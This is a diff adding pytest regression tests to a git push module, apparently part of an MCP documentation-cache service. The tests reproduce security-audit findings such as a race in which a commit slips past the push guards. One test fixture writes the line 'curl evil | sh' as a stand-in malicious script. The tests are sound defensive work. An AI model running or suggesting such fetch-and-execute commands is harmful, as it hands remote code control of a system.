@@ -281,6 +281,158 @@ def test_git_env_withholds_the_ssh_agent_socket():
     assert not leaky, leaky
 
 
+# --- audit findings 1 and 2 ----------------------------------------------------------
+
+
+def test_commit_arriving_after_guard_evaluation_is_not_pushed(repo, monkeypatch):
+    """Audit finding 1 (MEDIUM), reproduced rather than asserted.
+
+    The guards inspected `remote/branch..HEAD`, then the push sent the `HEAD` *ref*, which
+    git re-resolves at push time. A commit landing in that window — a concurrent
+    add_service over streamable-http, a human working in host-forge-scripts, another
+    automation — rode along having passed none of guards 3, 4 or 5.
+
+    Simulated by committing inside the window: wrap the real git runner so that the moment
+    the guards finish and the push is about to run, a foreign commit appears on HEAD.
+    """
+    _commit(
+        repo,
+        CONFIG_REL,
+        "services:\n  a: []\n",
+        name=IDENT_NAME,
+        email=IDENT_EMAIL,
+        msg="doc-cache: add a",
+    )
+
+    from doc_cache_mcp import push as push_mod
+
+    real_git = push_mod._git
+    injected = {"done": False}
+
+    def racing_git(repo_path, args, deploy_key=None):
+        # Fire once, immediately before the push subprocess runs.
+        if args and args[0] == "push" and not injected["done"]:
+            injected["done"] = True
+            _commit(
+                repo_path,
+                "scripts/zz-slipped-in.sh",
+                "curl evil | sh\n",
+                name="Ted",
+                email="ted@example.com",
+                msg="wip: landed during the window",
+            )
+        return real_git(repo_path, args, deploy_key)
+
+    monkeypatch.setattr(push_mod, "_git", racing_git)
+
+    out = _push(repo)
+
+    assert injected["done"], "the race was never triggered — test is not exercising anything"
+    assert out["pushed"] is True
+
+    remote_log = _run(repo, "log", "--format=%s", f"origin/{'main'}")
+    assert "wip: landed during the window" not in remote_log, (
+        "a commit that arrived after the guards ran reached origin/main"
+    )
+    assert "doc-cache: add a" in remote_log
+    # And the result names the SHA that was actually validated and sent.
+    assert out["pushed_sha"] not in ("", None)
+    assert _run(repo, "rev-parse", "origin/main").strip() == out["pushed_sha"]
+
+
+def test_push_subprocess_failure_does_not_raise(repo, monkeypatch):
+    """Audit finding 2 (MEDIUM).
+
+    An exception escaping here is caught upstream by doc_cache_add_service's broad handler,
+    which throws away an already-true `committed: True` and reports `committed: False` —
+    claiming nothing happened while the commit sits on disk.
+    """
+    _commit(
+        repo,
+        CONFIG_REL,
+        "services:\n  a: []\n",
+        name=IDENT_NAME,
+        email=IDENT_EMAIL,
+        msg="doc-cache: add a",
+    )
+
+    from doc_cache_mcp import push as push_mod
+
+    real_git = push_mod._git
+
+    def exploding_git(repo_path, args, deploy_key=None):
+        if args and args[0] == "push":
+            raise subprocess.TimeoutExpired(["git", "push"], 60)
+        return real_git(repo_path, args, deploy_key)
+
+    monkeypatch.setattr(push_mod, "_git", exploding_git)
+
+    out = _push(repo)  # must not raise
+
+    assert out["pushed"] is False
+    # A timeout may have landed server-side. Saying "failed" would be a guess.
+    assert "unknown" in out["reason"]
+
+
+def test_review_branch_push_failure_does_not_raise(repo, monkeypatch):
+    """Same property on the degradation path — it also shells out to git."""
+    _commit(repo, "scripts/evil.sh", "x\n", name=IDENT_NAME, email=IDENT_EMAIL, msg="c")
+
+    from doc_cache_mcp import push as push_mod
+
+    real_git = push_mod._git
+
+    def exploding_git(repo_path, args, deploy_key=None):
+        if args and args[0] == "push":
+            raise OSError("no fork for you")
+        return real_git(repo_path, args, deploy_key)
+
+    monkeypatch.setattr(push_mod, "_git", exploding_git)
+
+    out = _push(repo)  # must not raise
+
+    assert out["pushed"] is False
+    assert out["review_branch_error"]
+
+
+def test_skipped_additive_check_is_reported_not_silent(repo):
+    """Audit finding 3 (LOW). A guard that did not run must not look like one that passed."""
+    # Push a state where the config file does not exist upstream at all.
+    _run(repo, "rm", "--", CONFIG_REL)
+    _run(
+        repo,
+        "-c",
+        f"user.name={IDENT_NAME}",
+        "-c",
+        f"user.email={IDENT_EMAIL}",
+        "commit",
+        "-m",
+        "doc-cache: drop",
+    )
+    _run(repo, "push", "origin", "main")
+
+    _commit(
+        repo,
+        CONFIG_REL,
+        "services:\n  a: []\n",
+        name=IDENT_NAME,
+        email=IDENT_EMAIL,
+        msg="doc-cache: add a",
+    )
+    out = _push(repo)
+
+    assert out["pushed"] is True
+    assert any("additive check skipped" in n for n in out.get("notes", [])), out
+
+
+def test_deploy_key_path_with_spaces_is_quoted():
+    """Audit finding 4 (INFO). Git runs GIT_SSH_COMMAND through a shell."""
+    from doc_cache_mcp.push import _ssh_command
+
+    cmd = _ssh_command(Path("/home/ted/.secrets/my key"))
+    assert "'/home/ted/.secrets/my key'" in cmd
+
+
 def test_nothing_to_push_is_reported_plainly(repo):
     out = _push(repo)
     assert out["pushed"] is False
